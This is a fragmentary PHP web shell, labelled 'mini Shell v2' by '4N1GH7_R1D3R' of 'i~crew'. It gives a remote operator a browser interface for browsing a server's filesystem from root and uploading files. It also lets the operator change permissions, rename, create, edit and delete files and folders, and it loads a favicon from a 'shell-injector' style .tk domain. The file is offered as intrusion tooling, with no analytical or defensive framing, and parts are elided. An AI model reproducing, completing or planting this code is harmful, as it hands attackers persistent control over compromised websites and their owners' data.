...
<link rel="icon" type="image/png" href="https://5h311-1nj3c706.tk/favicon.ico"/>
</head>';
?>
<style> 
@font-face {
  ...
  font-style: normal;
  font-weight: 400;
  src: local('iceland'), local('iceland'), url(http://fonts.gstatic.com/l/font?kit=3oir0CAJ0QJ5h5-A3AP8rRSrmRvs-bRaaQbSAUyiv7A&skey=a4ba60ff9fc73cf8&v=v8) format('truetype');
}
body {

  background:    #000000;line-height: 1;color: gold;font-family: 'Iceland', cursive ;
...
input, textarea { font-family: 'Iceland' ; }
...
echo '</head>
<body><b>
<H1><center><font color="red">[ 4N1GH7_R1D3R ] </font> <font size="3px" color="red">mini Shell v2</font></center></h1>
...
if($pat == '' && $id == 0){
$a = true;
echo '<font color=gold><center>$ root@ : <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
...
echo '<font color="gold">File Upload</font><br />';
}else{
...
echo '<font color="gold">Change Permission Done </font><br />';
}else{
...
echo '<font color="gold">Change Name Done </font><br />';
}else{
...
echo '<font color="gold">Create File Done [ '.$new.' ]</font><br />';
}else{
...
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="gold">Edit File Done </font><br />';
}else{
...
if($_GET['type'] == 'dir'){
if(rmdir($patc)){
echo '<font color="gold">Delete File Done</font><br />';
}else{
...
echo '<font color="gold">Create Folder Done </font><br />';
}
}
//Delete file
...
echo '<br><center>-=[i~crew]=-</b>
<br><center> 4N1GH7_R1D3R </b>
</body>
</html>';
function perms($file){
